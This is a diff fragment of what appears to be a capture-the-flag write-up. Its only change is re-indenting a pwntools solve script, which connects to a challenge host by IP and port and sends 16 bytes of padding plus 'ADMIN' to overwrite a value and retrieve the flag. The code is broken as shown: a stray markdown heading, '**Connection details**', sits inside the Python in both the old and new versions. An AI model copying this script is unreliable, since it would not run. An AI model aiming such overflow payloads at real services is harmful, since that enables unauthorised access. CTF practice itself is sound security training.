@@ -47,34 +47,34 @@ Since this is a simple string input, you can just type it in the netcat session,
 
 **Python**
 
-`from pwn import *
-
-**Connection details**
-
-HOST = '133.88.122.244'
-PORT = 30766
-
-def solve():
-    io = remote(HOST, PORT)
-
-    # 1. Wait for the prompt
-    io.recvuntil(b"Input: ")
-
-    # 2. Construct the payload
-    # 16 bytes of padding + 'ADMIN'
-    padding = b"A" * 16
-    target_value = b"ADMIN"
-    payload = padding + target_value
-
-    log.info(f"Sending payload: {payload}")
-    io.sendline(payload)
-
-    # 3. Read the output and flag
-    response = io.recvall().decode()
-    print(response)
-
-if __name__ == "__main__":
-    solve()`
+    `from pwn import *
+    
+    **Connection details**
+    
+    HOST = '133.88.122.244'
+    PORT = 30766
+    
+    def solve():
+        io = remote(HOST, PORT)
+    
+        # 1. Wait for the prompt
+        io.recvuntil(b"Input: ")
+    
+        # 2. Construct the payload
+        # 16 bytes of padding + 'ADMIN'
+        padding = b"A" * 16
+        target_value = b"ADMIN"
+        payload = padding + target_value
+    
+        log.info(f"Sending payload: {payload}")
+        io.sendline(payload)
+    
+        # 3. Read the output and flag
+        response = io.recvall().decode()
+        print(response)
+    
+    if __name__ == "__main__":
+        solve()`
 
 ### **Manual Solve**
 
